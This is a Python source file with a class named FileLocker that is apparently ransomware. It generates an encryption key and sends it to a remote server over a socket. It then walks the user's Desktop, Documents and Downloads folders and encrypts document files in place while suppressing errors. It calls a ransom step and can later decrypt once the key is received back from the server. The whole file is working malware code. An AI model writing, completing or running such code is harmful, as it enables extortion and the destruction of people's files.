from cryptography.fernet import Fernet
import os, socket, threading, json

class FileLocker:
    def __init__(self):
        self.home = os.environ["USERPROFILE"]
        self.locations = ("Desktop", "Documents", "Downloads")
        self.encrypt_ext = (".txt", ".pdf", ".csv", ".docx", ".pptx", ".xlsx")
        self.files = []
        self.key = None
        self.server_ip = ""
        self.server_port = 31415
        self.server_addr = (self.server_ip, self.server_port)

    def create_key(self):
        self.key = Fernet.generate_key()
    
    def send_key(self):
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as client:
            while True:
                try:
                    client.connect(self.server_addr)
                    client.send(self.key)
                    break
                except ConnectionRefusedError:
                    pass
    
    def receive_key(self):
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as client:
            while True:
                try:
                    client.connect(self.server_addr)
                    received_key = client.recv(1024)  # Receive up to 1024 bytes, might have to extend
                    self.key = received_key
                    break
                except ConnectionRefusedError:
                    pass

    def find_files(self):
        for location in self.locations:
            for root, dirs, items in os.walk(os.path.join(self.home, location)):
                for item in items:
                    ext = os.path.splitext(item)[1]

                    if ext in self.encrypt_ext:
                        self.files.append(os.path.join(root, item))

    def encrypt_files(self):
        for file in self.files:
            self.encrypt_file(file)

    def encrypt_file(self, file):
        try:
            with open(file, "rb") as f:
                contents = f.read()

            contents = Fernet(self.key).encrypt(contents)

            with open(file, "wb") as f:
                f.write(contents)
        except:
            pass
    
    def decrypt_files(self):
        for file in self.files:
            self.decrypt_file(file)

    def decrypt_file(self, file):
        try:
            with open(file, "rb") as f:
                contents = f.read()
            
            contents = Fernet(self.key).decrypt(contents)

            with open(file, "wb") as f:
                f.write(contents)
        except:
            pass
    
    def save_files(self):
        with open("files.json", "w") as f:
            json.dump(self.files, f)
    
    def load_files(self):
        with open("files.json", "r") as f:
            self.files = json.load(f)

    def start(self):
        self.create_key()

        send_thread = threading.Thread(target=self.send_key)
        send_thread.start()

        self.find_files()
        self.encrypt_files()
        self.ransom()
        self.save_files()
    
    def decrypt(self):
        self.receive_key()
        self.decrypt_files()